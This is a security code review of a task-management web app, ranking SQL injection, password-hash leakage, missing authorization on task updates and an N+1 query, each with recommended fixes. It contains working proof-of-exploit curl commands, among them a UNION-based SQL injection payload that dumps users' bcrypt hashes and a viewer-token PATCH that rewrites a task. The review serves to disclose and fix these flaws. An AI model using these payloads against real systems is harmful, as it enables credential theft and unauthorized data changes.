# TaskBoard — Code Review

Top 4 issues found, prioritized by business impact. All findings were verified against the running app (`localhost:3000`, seed data). Three of the four are exploitable live and include reproduction steps.

| # | Issue | Category | Severity |
|---|-------|----------|----------|
| 1 | SQL injection in task search | Security | **Critical** |
| 2 | Password hashes exposed in project detail | Security / Data Integrity | **High** |
| 3 | Broken access control on task update (`PATCH`) | Security / Access Control | **High** |
| 4 | N+1 / full-table over-fetch when listing projects | Performance | **Medium** |

---

## 1. SQL injection in task search (`$queryRawUnsafe`)

- **File:** `src/app/api/projects/[id]/tasks/route.ts:27-34`
- **Category:** Security
- **Severity:** Critical

**Description.** The task-search branch builds raw SQL by string-interpolating the user-supplied `q` query parameter (and `projectId`) directly into a `$queryRawUnsafe` call. There is no escaping or parameterization, so any authenticated user can break out of the string literal and run arbitrary SQL — reading or modifying every table in the database, including the `users` table. This is a full database compromise reachable by the lowest-privileged (viewer) account.

**Proof of exploit — dump every user's bcrypt hash via the search box:**

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
PID="cmqbx6zut0006p76dh5bklft8"   # Q3 Launch

curl -s -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=zzzz') UNION SELECT id, 'LEAK', name, password_hash, 'todo'::\"TaskStatus\", NULL, id, 0, created_at, updated_at FROM users -- " \
  "http://localhost:3000/api/projects/$PID/tasks"
```

**Response (truncated) — credentials of users who are not even in this project are returned:**

```json
{ "tasks": [
  { "id": "cmqbx6zur0001...", "project_id": "LEAK", "title": "Arjun Rao",
    "description": "$2a$10$cIOGtZjBhFZwbfiO3sBV/OaSv.Q7/XfpulP4PjlYEQEZjyxBIXA36", "status": "todo", ... },
  { "id": "cmqbx6zuq0000...", "project_id": "LEAK", "title": "Meera Iyer",
    "description": "$2a$10$cIOGtZjBhFZwbfiO3sBV/OaSv.Q7/XfpulP4PjlYEQEZjyxBIXA36", ... },
  { "title": "Dev Sharma",  "description": "$2a$10$cIOGtZ..." },
  { "title": "Lina Joshi",  "description": "$2a$10$cIOGtZ..." },
  { "title": "Kavya Reddy", "description": "$2a$10$cIOGtZ..." }
] }
```

A trivial variant `q=' OR '1'='1` returns all tasks regardless of project, confirming injection even without the UNION.

**Recommended fix.** Never interpolate input into SQL. Use Prisma's query API (it already supports the needed filter):

```ts
const tasks = await prisma.task.findMany({
  where: {
    projectId,
    OR: [
      { title:       { contains: q, mode: "insensitive" } },
      { description:  { contains: q, mode: "insensitive" } },
    ],
  },
  orderBy: { position: "asc" },
});
```

If raw SQL is truly required, use parameterized `$queryRaw` tagged templates (`prisma.$queryRaw\`... WHERE project_id = ${projectId} ...\``) so values are bound, never concatenated.

---

## 2. Password hashes exposed in project detail response

- **File:** `src/app/api/projects/[id]/route.ts:25-40`
- **Category:** Security / Data Integrity
- **Severity:** High

**Description.** The `GET /api/projects/:id` handler includes related users with `owner: true`, `memberships: { include: { user: true } }`, and tasks with `assignee: true` / `createdBy: true`. Prisma's `include: true` returns *all* scalar columns of `User`, including `passwordHash`, so every project-detail call ships the bcrypt hashes of the owner and all members to the client. Offline cracking of those hashes leads directly to account takeover.

**Proof of exploit:**

```bash
curl -s -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/projects/$PID" | grep -o passwordHash | wc -l
# -> 18   (owner + 4 members + task assignee/createdBy records, all carrying passwordHash)
```

The leaked value (`$2a$10$cIOGtZjBhFZwbfiO3sBV/OaSv...`) appears in the `owner`, every `memberships[].user`, and each task's `assignee`/`createdBy` object.

**Recommended fix.** Never use `include: true` on `User`. Replace with explicit `select` lists that exclude `passwordHash` everywhere a user is embedded, e.g.:

```ts
const userPublic = { select: { id: true, name: true, email: true } };
// owner: userPublic,
// memberships: { include: { user: userPublic } },
// tasks: { include: { assignee: userPublic, createdBy: userPublic } }
```

Consider a shared `userPublicSelect` constant and an ESLint guard against `include: { user: true }` to prevent regressions.

---

## 3. Broken access control on task update (`PATCH /api/tasks/:id`)

- **File:** `src/app/api/tasks/[id]/route.ts:16-38`
- **Category:** Security / Access Control
- **Severity:** High

**Description.** The `PATCH` handler authenticates the caller but never loads their `Membership` or checks their role — unlike `DELETE` in the same file (lines 49-53) and every other write endpoint. Any logged-in user can therefore modify any task in any project (title, status, assignee, position) simply by knowing the task id, including users with no membership at all and read-only `viewer` members. This is both an authorization bypass and a privilege-escalation: viewers gain write access they are explicitly denied elsewhere.

**Proof of exploit — a `viewer` (read-only) rewrites a task they should not touch:**

```bash
VIEWER=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"dev@example.com","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

curl -s -X PATCH "http://localhost:3000/api/tasks/cmqbx6zuy000vp76d80gz5j9c" \
  -H "Authorization: Bearer $VIEWER" -H "Content-Type: application/json" \
  -d '{"title":"PWNED by a viewer","status":"done"}'
```

**Response (200 OK — the write succeeds despite the viewer role):**

```json
{ "task": { "id": "cmqbx6zuy000vp76d80gz5j9c", "title": "PWNED by a viewer",
            "status": "done", "projectId": "cmqbx6zut0006p76dh5bklft8", ... } }
```

**Recommended fix.** Mirror the `DELETE` handler: after loading the task, resolve the caller's membership on `existing.projectId` and enforce `canEditTasks(role)` before updating.

```ts
const existing = await prisma.task.findUnique({ where: { id } });
if (!existing) return notFound("task not found");

const membership = await getProjectMembership(user.id, existing.projectId);
if (!membership) return forbidden("you are not a member of this project");
if (!canEditTasks(membership.role)) return forbidden("viewers cannot edit tasks");
```

(Also consider validating that a supplied `assigneeId` is itself a member of the project.)

---

## 4. N+1 / full-table over-fetch when listing projects

- **File:** `src/app/api/projects/route.ts:10-31`
- **Category:** Performance
- **Severity:** Medium

**Description.** `GET /api/projects` loads every membership with `project.tasks: true`, pulling **all task rows** for **every** project the user belongs to, only to compute `taskCount: m.project.tasks.length`. For a user on several active boards with thousands of tasks this transfers and deserializes large volumes of unused data on every dashboard load, and the cost grows linearly with task count. It is wasted I/O and memory for a number that the database can compute directly.

**Recommended fix.** Ask Postgres for the count instead of materializing the rows:

```ts
const memberships = await prisma.membership.findMany({
  where: { userId: user.id },
  include: {
    project: {
      include: {
        owner: { select: { id: true, name: true, email: true } },
        _count: { select: { tasks: true } },
      },
    },
  },
  orderBy: { createdAt: "desc" },
});
// taskCount: m.project._count.tasks
```

---

## Other issues noted (beyond the top 4)

- **`User.email` has no `@unique` constraint** (`prisma/schema.prisma:25`). Registration uses `findFirst` with a check-then-insert race, so duplicate accounts on the same email are possible, and login (`findFirst`) becomes ambiguous. *Fix:* add `@unique` and rely on a `P2002` catch instead of the pre-check. (Data Integrity)
- **30-day JWTs with no revocation, stored in `localStorage`** (`src/lib/jwt.ts:7`, `src/lib/api-client.ts`). Long-lived bearer tokens in `localStorage` are readable by any XSS and cannot be invalidated on logout. *Fix:* shorter expiry + refresh tokens, ideally httpOnly cookies. (Security)
- **Thin test coverage** — no tests exercise the API route authorization paths (`src/tests/`), which is why issues #1–#3 shipped. *Fix:* add integration tests asserting 403s for viewers/non-members and that responses never contain `passwordHash`. (Testing)
